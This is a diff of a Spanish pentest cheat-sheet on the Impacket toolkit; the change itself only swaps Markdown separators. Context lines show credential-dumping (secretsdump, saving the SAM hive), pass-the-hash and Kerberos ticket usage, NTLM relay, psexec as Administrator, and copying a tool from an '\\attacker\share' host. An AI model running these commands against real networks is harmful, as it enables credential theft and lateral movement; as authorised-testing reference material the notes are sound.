@@ -30,7 +30,7 @@ linked:
 ---
 # Impacket Toolkit
 
-***
+---
 
 ## Overview
 
@@ -40,7 +40,7 @@ Binarios en `$PATH` tras instalación: `impacket-<tool>` o `<tool>.py` si está 
 
 > Regla: Impacket acepta PtH (`-hashes LM:NT`), Kerberos (`-k -no-pass` con `KRB5CCNAME`), AES key (`-aesKey`). Todos los tools usan el formato `DOMAIN/user:pass@target`.
 
-***
+---
 
 ## Sintaxis compartida
 
@@ -54,7 +54,7 @@ KRB5CCNAME=user.ccache <tool> -k -no-pass <user>@<target>.<domain>
 
 Targets FQDN son obligatorios para Kerberos.
 
-***
+---
 
 ## Ejecución remota
 
@@ -112,7 +112,7 @@ SQL> enum_links
 SQL> enum_impersonate
 ```
 
-***
+---
 
 ## Kerberos
 
@@ -188,7 +188,7 @@ impacket-describeTicket ticket.ccache
 
 Parse completo de ticket: flags, groups (PAC), validity.
 
-***
+---
 
 ## Credential dumping
 
@@ -216,7 +216,7 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 
 Ver [[DCSync]].
 
-***
+---
 
 ## LDAP / AD
 
@@ -258,7 +258,7 @@ impacket-reg DOMAIN/user:pass@target save -keyName 'HKLM\SAM' -o \\target\C$\tem
 impacket-reg DOMAIN/user:pass@target query -keyName 'HKLM\SOFTWARE\Microsoft\...'
 ```
 
-***
+---
 
 ## NTLM Relay
 
@@ -292,7 +292,7 @@ proxychains impacket-secretsdump -no-pass DOMAIN/user@target
 
 Ver [[NTLM Relay]] para flows completos + coerción.
 
-***
+---
 
 ## SMB interactivo
 
@@ -316,7 +316,7 @@ impacket-smbserver share /tmp/share -smb2support -username u -password p
 copy \\attacker\share\tool.exe .
 ```
 
-***
+---
 
 ## Otros útiles
 
@@ -383,7 +383,7 @@ Rogue SMB server, responde a cualquier file con uno controlado.
 
 Wrapper remoto para Mimikatz vía DCOM/SMB.
 
-***
+---
 
 ## Flows típicos
 
@@ -413,7 +413,7 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass Administrator@dc.b.local
 ```
 
-***
+---
 
 ## Referencias
 
